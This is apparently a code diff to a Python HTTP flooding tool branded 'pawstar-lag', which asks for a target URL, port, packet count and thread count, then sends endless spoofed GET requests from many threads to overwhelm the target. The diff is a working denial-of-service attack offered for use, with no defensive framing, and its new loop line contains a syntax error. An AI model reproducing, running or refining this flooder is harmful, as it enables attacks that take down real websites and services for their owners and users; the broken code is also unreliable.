@@ -1,12 +1,22 @@
 import socket
 import random
 import threading
+print('''                 _                    _              
+                         | |                  | |            
+ _ __   __ ___      _____| |_ __ _ _ __ ______| | __ _  __ _ 
+| '_ \ / _` \ \ /\ / / __| __/ _` | '__|______| |/ _` |/ _` |
+| |_) | (_| |\ V  V /\__ \ || (_| | |         | | (_| | (_| |
+| .__/ \__,_| \_/\_/ |___/\__\__,_|_|         |_|\__,_|\__, |
+| |                                                     __/ |
+|_|                                                    |___/
+Created by pawstar-lag
+Contact: foxxxqi_qsd1@protonmail.com
+Any impovements needed? Feel free to pull request!
+''')
 url=raw_input("[+] Enter the target URL: ")
-port=raw_input("[+] Enter the port to attack: ")
-try:
-  tn=int(raw_input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
-except:
-  print("[-] Sorry, input needs to be an integer.")
+port=int(raw_input("[+] Enter the port to attack: "))
+pack=int(raw_input("[+] Enter the number of packets in each request: "))
+tn=int(raw_input("[+] Enter the number of threads (higher threads, faster packet sending, but more internet bandwith used): "))
 # damn a lot of user agents
 useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
               "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -45,17 +55,21 @@ ref = ['http://www.bing.com/search?q=',
 ]
 ua = "User-Agent: " + random.choice(useragents) + "\r\n"
 accept = random.choice(acceptall)
-reffer = "Referer: " + random.choice(ref) + str(url) + "\r\n"
+reffer = "Referer: " + random.choice(ref) + url + "\r\n"
 content = "Content-Type: application/x-www-form-urlencoded\r\n"
 length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
 target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(url), int(port))
 req_args = target_host + ua + accept + reffer + content + length + "\r\n"
 def httpspam():
+  hh = random._urandom
+  xx = int(0)
   while True:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      s.connect((str(url), int(port)))
+      s.connect((url, port))
       s.send(str.encode(req_args))
-      print("[+] HTTP request sent")
+      for i in range pack:
+        s.send(str.encode(req_args))
+      print("[+] HTTP request {0} sent to {1}:{2}".format(str(xx),url,str(port)))
 threads = []
 # threading
 for i in range(tn):
